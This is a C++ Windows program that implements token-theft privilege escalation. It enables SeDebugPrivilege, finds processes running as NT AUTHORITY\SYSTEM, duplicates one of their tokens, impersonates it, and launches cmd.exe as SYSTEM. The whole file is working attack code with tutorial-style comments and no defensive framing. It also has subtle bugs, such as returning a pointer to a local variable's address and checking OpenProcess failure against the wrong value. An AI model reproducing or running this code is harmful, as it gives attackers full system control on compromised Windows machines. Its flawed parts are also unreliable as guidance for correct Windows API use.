#include <windows.h>
#include <UserEnv.h>
#include <TlHelp32.h>
#include <iostream>
#include <list>

#pragma comment(lib,"userenv.lib")

bool IsRunningAsNTSystem(DWORD pid) {
	HANDLE token = {};
	// Although we would call OpenProcess with TOKEN_QUERY anyway, this also functions as a test to see if it is protected
	// This is because Windows process protection doesn't normally allow access to protected processes with this privilege unless the accessing process also has process protection
	HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,false,pid);
	if (!OpenProcessToken(process, TOKEN_QUERY, &token)) {
		CloseHandle(process);
		return false;
	}
	DWORD size = 0;
	if (GetTokenInformation(token, TokenUser, NULL, 0, &size)) {
		CloseHandle(token);
		CloseHandle(process);
		return false;
	}
	PTOKEN_USER token_user = (PTOKEN_USER)LocalAlloc(LPTR, size);
	if (!GetTokenInformation(token, TokenUser, token_user, size, &size)) {
		LocalFree(token_user);
		CloseHandle(token);
		CloseHandle(process);
		return false;
	}
	// Checks if the token_user SID matches the system SID
	bool is_system = IsWellKnownSid(token_user->User.Sid, WinLocalSystemSid);
	LocalFree(token_user);
	CloseHandle(token);
	CloseHandle(process);
	return is_system;
}

std::list<DWORD> FindUnprotectedNTSystemProcesses() {
	std::list<DWORD> processes = {};
	// Finds a process running as "NT AUTHORITY\SYSTEM"
	PROCESSENTRY32W proc_entry = {};
	DWORD pid = 0;
	proc_entry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE toolhelp_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(toolhelp_snapshot, &proc_entry);
	do {
		bool is_system = IsRunningAsNTSystem(proc_entry.th32ProcessID);
		if (is_system) {
			processes.push_back(proc_entry.th32ProcessID);
			// pid = proc_entry.th32ProcessID;
			// break;
		}
	} while (Process32Next(toolhelp_snapshot, &proc_entry));
	CloseHandle(toolhelp_snapshot);
	return processes;
}

LUID PrivilegeNameToLUID(LPCWSTR privilege_name) {
	LUID luid = {};
	// To get the LUID of a privilege value, we need to use LookupPrivilegeValue with the privilege_name
	if(!LookupPrivilegeValue(NULL, privilege_name, &luid)) return (LUID)NULL;
	return luid;
}

bool EnableSEDebugPrivilegeForToken(PHANDLE token) {
	TOKEN_PRIVILEGES token_privs;
	// To create a TOKEN_PRIVILEGES object with SeDebugPrivilege enabled, we need SeDebugPrivilege's LUID (unique identifier)
	// Once we do that, we can set its attribute to SE_PRIVILEGE_ENABLED to enable it for our TOKEN_PRIVILEGES object
	// We're giving the object just one privilege, so we set PrivilegeCount to 1
	LUID se_debug_luid = PrivilegeNameToLUID(SE_DEBUG_NAME);
	std::cout << "SeDebugPrivilege LUID Low Part : " << se_debug_luid.LowPart << std::endl;
	token_privs.PrivilegeCount = 1;
	token_privs.Privileges[0].Luid = se_debug_luid;
	token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Once we've created a TOKEN_PRIVILEGES object, we can use AdjustTokenPrivileges to move its permissions to our original token
	if (!AdjustTokenPrivileges(*token, FALSE, &token_privs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		std::cout << "Failed to call AdjustTokenPrivileges" << std::endl;
		return false;
	}
	// The error indicator might also be ERROR_NOT_ALL_ASSIGNED
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		std::cout << "Failed to call AdjustTokenPrivileges" << std::endl;
		return false;
	}
	std::cout << "Called AdjustTokenPrivileges" << std::endl;
	return true;
}

HANDLE CopyNTSystemToken(DWORD pid) {
	HANDLE token = NULL;
	HANDLE new_token = NULL;
	std::cout << "Finding system process..." << std::endl;
	std::cout << "Found PID : " << pid << std::endl;
	// Opens a process handle on the system process
	HANDLE system_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (system_handle == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open processwith PROCESS_QUERY_LIMITED_INFORMATION" << std::endl;
		CloseHandle(system_handle);
		CloseHandle(token);
		return INVALID_HANDLE_VALUE;
	}
	std::cout << "Opened system process" << std::endl;

	// Opens the system process' token
	if (!OpenProcessToken(system_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
		std::cout << "Failed to open process token with TOKEN_DUPLICATE | TOKEN_QUERY" << std::endl;
		CloseHandle(system_handle);
		return INVALID_HANDLE_VALUE;
	}
	std::cout << "Opened process token" << std::endl;
	// Duplicates this token as a primary token
	if (!DuplicateTokenEx(token, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &new_token)) {
		std::cout << "Failed to call DuplicateTokenEx" << std::endl;
		CloseHandle(system_handle);
		CloseHandle(new_token);
		return INVALID_HANDLE_VALUE;
	}
	std::cout << "Duplicated process token" << std::endl;

	// Impersonates an "NT AUTHORITY\SYSTEM" process to give our own process the same privileges
	// This is optional, since we can still use the token with CreateProcessWithTokenW
	if (!ImpersonateLoggedOnUser(new_token)) {
		std::cout << "Failed to call ImpersonateLoggedOnUser" << std::endl;
		CloseHandle(new_token);
		CloseHandle(system_handle);
		return INVALID_HANDLE_VALUE;
	}
	std::cout << "Impersonated logged on user" << std::endl;

	CloseHandle(system_handle);
	return new_token;
}

bool start_process(HANDLE token, LPVOID* env_block) {
	std::cout << "Starting process..." << std::endl;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	// Initializing the STARTUPINFOW and PROCESS_INFORMATION objects
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	
	wchar_t cmd_line[] = L"C:\\Windows\\System32\\cmd.exe";
	wchar_t curr_dir[] = L"C:\\Windows\\System32\\";
	// Our own process should be running as "NT AUTHORITY\SYSTEM" by this point
	// Since it is a primary token, we can use CreateProcessWithTokenW to spawn another process
	std::cout << "Error code before : " << GetLastError() << std::endl;
	bool success = CreateProcessWithTokenW(
		token,
		LOGON_WITH_PROFILE, // Logon flags
		cmd_line,  // Application name (i.e., "C:\Windows\System32\cmd.exe")
		NULL, // Command line; If we specify NULL for the application name, it runs this instead
		CREATE_UNICODE_ENVIRONMENT, // Creation flags
		*env_block, // Environment variables
		curr_dir, // Directory to start in
		&si, //  Startup info
		&pi) != 0; // Process information info
	std::cout << "Error code after : " << GetLastError() << std::endl;
	DestroyEnvironmentBlock(*env_block);
	return success;
}

LPVOID* GetSelfEnvironmentBlock(HANDLE token) {
	LPVOID env_block = NULL;
	if (!CreateEnvironmentBlock(&env_block, token, TRUE)) {
		std::cout << "Failed to open own environment block" << std::endl;
		return nullptr;
	}
	return &env_block;
}

bool ElevateToNTSystem() {
	std::cout << "Elevating to 'NT AUTHORITY\\System'" << std::endl;
	// 1. Enable SeDebugPrivilege (gives us the required permission to access system processes)
	// 2. Find a process running as "NT AUTHORITY\SYSTEM"
	// 3. Open this process with PROCESS_QUERY_LIMITED_INFORMATION
	// 4. Open this process' token with TOKEN_DUPLICATE | TOKEN_QUERY
	// 5. Call DuplicateTokenEx on this token to get a duplicated primary token
	// 6. Spawn process with CreateProcessWithTokenW, passing it our own environment block
	HANDLE token = {};
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token)) {
		std::cout << "Failed to open own process token" << std::endl;
		// GetCurrentProcess() returns a pseudotoken, so we don't need to close it
		return false;
	}
	LPVOID* curr_env_block = GetSelfEnvironmentBlock(token);
	if (curr_env_block == nullptr) return false;
	if (!EnableSEDebugPrivilegeForToken(&token)) {
		CloseHandle(token);
		return false;
	}
	CloseHandle(token);
	bool success;
	std::list<DWORD> pids = FindUnprotectedNTSystemProcesses();
	for (DWORD& pid : pids) { // Cycles through all "NT AUTHORITY\SYSTEM" processes and attempts to elevate with each one individually
		HANDLE system_token = CopyNTSystemToken(pid);
		if (system_token == INVALID_HANDLE_VALUE) {
			CloseHandle(system_token);
			continue;
		}
		success = start_process(system_token,curr_env_block);
		std::cout << "Success : " << success << std::endl;
		CloseHandle(system_token);
		if (success) break;
		RevertToSelf(); // Resets the token to our one with SeDebugPrivilege since our copied token might not have it
	}
	return true;
}
int main() {
	return (int)(ElevateToNTSystem());
}